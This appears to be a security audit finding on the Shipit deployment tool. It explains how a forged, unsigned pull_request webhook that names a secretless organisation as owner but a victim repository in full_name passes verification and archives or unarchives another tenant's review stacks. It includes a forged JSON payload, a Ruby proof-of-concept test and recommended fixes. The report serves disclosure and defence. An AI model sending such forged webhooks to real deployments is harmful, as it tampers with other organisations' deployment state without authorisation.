### Title
Cross-tenant PR webhook forgery: `repository_owner` used for signature verification is never checked against `repository.full_name` used by handlers - ([File: app/controllers/shipit/webhooks_controller.rb, app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb])

### Summary
`Shipit::WebhooksController#verify_signature` selects the GitHub App/secret to verify a webhook against using `repository_owner` (derived from `params.dig('repository','owner','login')` or `params.dig('organization','login')`), while every `PullRequest` handler (e.g. `UnlabeledHandler`) independently resolves the target `Repository`/`Stack` from `params.repository.full_name`. Nothing enforces that the owner used for signature verification matches the owner encoded in `full_name`, and `GitHubApp#verify_webhook_signature` returns `true` unconditionally whenever the selected organization has no `webhook_secret` configured. In a multi-org Shipit deployment where at least one configured organization has no secret, an attacker can forge a `pull_request`/`unlabeled` payload whose `repository.owner.login` points at the no-secret org (so verification trivially passes) but whose `repository.full_name` points at a victim org/repo, causing the handler to archive/unarchive or provision/deprovision the victim's review stack.

### Finding Description
The broken binding: the code should enforce `repository_owner (used to pick the verifying GithubApp/secret) == owner_segment(params.repository.full_name) (used by the handler to resolve the target Repository/Stack)`. This equality is never checked.

Path:
1. `WebhooksController#verify_signature` computes `repository_owner` from the payload [1](#0-0) , fetches `Shipit.github(organization: repository_owner)` [2](#0-1) , and calls `verify_webhook_signature`.
2. `GitHubApp#verify_webhook_signature` returns `true` unconditionally when that specific organization has no `webhook_secret` configured, and only accepts `sha1=` signatures otherwise [3](#0-2) .
3. On success, `Shipit::Webhooks.for_event('pull_request')` fans the same raw JSON body out to all PR handlers, including `UnlabeledHandler` [4](#0-3) .
4. `UnlabeledHandler` resolves the repository/stack purely from `params.repository.full_name`, completely independent of the `repository.owner.login` value used for verification [5](#0-4) , and mutates the resolved stack (`archive!`/`unarchive!`) [6](#0-5) .

Exploit: In a Shipit instance configured for multiple GitHub organizations (`secrets.github` keyed by org, as shown in `config/secrets.development.shopify.yml`) where one org ("no-secret-org") has `webhook_secret: nil`, the attacker POSTs to `/webhooks` with header `X-Github-Event: pull_request`, no signature header (or any arbitrary `X-Hub-Signature`), and a body:
```json
{
  "action": "unlabeled",
  "repository": { "owner": { "login": "no-secret-org" }, "full_name": "victim-org/victim-repo" },
  "pull_request": { ... state: "open", head: {...}, labels: [] ... }
}
```
`repository_owner` resolves to `"no-secret-org"`, whose `GitHubApp` has no secret, so `verify_webhook_signature` returns `true` regardless of the (attacker-controlled, possibly absent) signature header. Execution proceeds to `UnlabeledHandler`, which resolves `Repository.from_github_repo_name("victim-org/victim-repo")` and archives/unarchives/mutates the victim's review stack — a repository the attacker never authenticated against.

Why existing guards fail: `drop_unhandled_event` only checks the event type is registered, not payload consistency [7](#0-6) . `ExplicitParameters` schemas in the handlers validate field *types/presence* only, not cross-org consistency [8](#0-7) . `verify_signature`'s `GithubOrganizationUnknown` rescue only protects against unregistered organizations, not against a registered-but-secretless organization being used as a signing decoy for a different, secret-protected org's repo [9](#0-8) .

### Impact Explanation
An attacker who can only get one Shipit-configured organization to have no `webhook_secret` (or find that such an org already exists in a multi-org deployment) can forge webhook events that mutate any *other* tenant's review stacks (archive, unarchive, trigger provisioning/deprovisioning, assign PR metadata) purely by supplying a mismatched `owner.login`/`full_name` pair, with no knowledge of the victim org's actual `webhook_secret`. This is a cross-tenant state manipulation where one repository's (attacker-controlled) payload mutates another repository's stack records, matching the Critical impact category. The blast radius covers every PR-event handler (`OpenedHandler`, `ClosedHandler`, `ReopenedHandler`, `EditedHandler`, `AssignedHandler`, `LabeledHandler`, `UnlabeledHandler`, `LabelCapturingHandler`), not just `unlabeled`, since all share the same `repository.full_name`-based resolution and the same controller-level verification bypass.

### Likelihood Explanation
This requires the Shipit deployment to run in **multi-organization mode** (`secrets.github` keyed by org, per `github_app_config`) with **at least one** configured organization lacking a `webhook_secret` — a configuration explicitly supported and shown as a valid default in the example secrets files (`webhook_secret: # nil`). Given that precondition, the attack is a single unauthenticated HTTP POST with no GitHub credentials, no valid signature, and no privileged role — trivially repeatable against any repository/stack whose `full_name` the attacker can guess or observe. In a single-organization deployment with a configured secret, this specific bypass does not apply (there is only one org, so `repository_owner` and `full_name`'s owner segment would necessarily coincide operationally, though still not enforced in code).

### Recommendation
- In `WebhooksController#verify_signature`, after resolving `repository_owner`, also derive the owner encoded in `params.dig('repository','full_name')` (and any other repository-identifying field the handlers use) and reject the request (422) if they don't match.
- Do not allow `verify_webhook_signature` to unconditionally return `true` when `webhook_secret` is blank in multi-org configurations; instead, require every configured organization to have a non-blank secret, or explicitly disable processing for secretless orgs.
- Add support for and require `X-Hub-Signature-256` verification, retiring silent sha1-only acceptance.

### Proof of Concept
```ruby
module Shipit
  class WebhooksControllerCrossTenantTest < ActionController::TestCase
    test "forged pull_request unlabeled via no-secret org mutates victim org's stack" do
      # Arrange: two orgs configured, "no-secret-org" has webhook_secret: nil,
      # "victim-org" repo has an active, non-archived review stack.
      victim_repo = shipit_repositories(:victim) # full_name "victim-org/victim-repo"
      victim_repo.update!(review_stacks_enabled: true, provisioning_behavior: :allow_with_label,
                           provisioning_label_name: "deploy-me")
      stack = create_review_stack(victim_repo) # not archived, label "deploy-me" present

      forged_payload = {
        "action" => "unlabeled",
        "number" => stack.pull_request.number,
        "repository" => { "owner" => { "login" => "no-secret-org" }, "full_name" => "victim-org/victim-repo" },
        "pull_request" => {
          "id" => 1, "number" => stack.pull_request.number, "url" => "https://api.github.com/x",
          "title" => "x", "state" => "open", "additions" => 1, "deletions" => 1,
          "head" => { "sha" => "abc", "ref" => "pr-branch" },
          "user" => { "login" => "attacker" }, "assignees" => [],
          "labels" => [] # label removed -> archive? true per repository provisioning_behavior
        },
        "sender" => { "login" => "attacker" }
      }.to_json

      request.headers['X-Github-Event'] = 'pull_request'
      # no X-Hub-Signature header at all, or an arbitrary one

      assert_equal 'no-secret-org', JSON.parse(forged_payload).dig('repository', 'owner', 'login')
      assert_equal 'victim-org/victim-repo', JSON.parse(forged_payload).dig('repository', 'full_name')
      refute_equal 'no-secret-org', 'victim-org' # binding under test: these MUST match to be safe; they don't

      post :create, body: forged_payload, as: :json
      assert_response :ok

      assert stack.reload.archived?, "attacker forged unlabeled event archived victim-org's stack via no-secret-org signature bypass"
    end
  end
end
```
This demonstrates the equality `repository_owner == owner(full_name)` is violated: the attacker supplies `repository_owner = "no-secret-org"` (trivially verified) while the handler mutates `victim-org/victim-repo`'s stack, proving cross-tenant state manipulation without knowledge of `victim-org`'s `webhook_secret`.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L19-22)
```ruby
    def drop_unhandled_event
      # Acknowledge, but do nothing
      head(204) unless Shipit::Webhooks.for_event(event).present?
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L39-49)
```ruby
    rescue Shipit::GithubOrganizationUnknown => e
      head(422)
      Rails.logger.warn([
        'WebhookController#verify_signature',
        'Webhook from unknown organization',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "unknown_organization=#{e.message}",
        "status=#{status}"
      ].join(' '))
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/models/shipit/webhooks.rb (L9-18)
```ruby
          'pull_request' => [
            Handlers::PullRequest::OpenedHandler,
            Handlers::PullRequest::ClosedHandler,
            Handlers::PullRequest::ReopenedHandler,
            Handlers::PullRequest::EditedHandler,
            Handlers::PullRequest::AssignedHandler,
            Handlers::PullRequest::LabeledHandler,
            Handlers::PullRequest::UnlabeledHandler,
            Handlers::PullRequest::LabelCapturingHandler
          ],
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L8-39)
```ruby
          params do
            requires :action, String
            requires :number, Integer
            requires :pull_request do
              requires :id, Integer
              requires :number, Integer
              requires :url, String
              requires :title, String
              requires :state, String
              requires :additions, Integer
              requires :deletions, Integer
              requires :head do
                requires :sha, String
                requires :ref, String
              end
              requires :user do
                requires :login, String
              end
              requires :assignees, Array do
                requires :login, String
              end
              requires :labels, Array do
                requires :name, String
              end
            end
            requires :repository do
              requires :full_name, String
            end
            requires :sender do
              requires :login, String
            end
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L49-57)
```ruby
          def handle
            if archive?
              stack.archive!
            elsif unarchive?
              stack.unarchive!
            end

            stack
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/unlabeled_handler.rb (L59-69)
```ruby
          def repository
            @repository ||=
              Shipit::Repository.from_github_repo_name(params.repository.full_name) ||
              Shipit::NullRepository.new
          end

          def stack
            @stack ||=
              Shipit::Webhooks::Handlers::PullRequest::ReviewStackAdapter
              .new(params, scope: repository.review_stacks)
          end
```
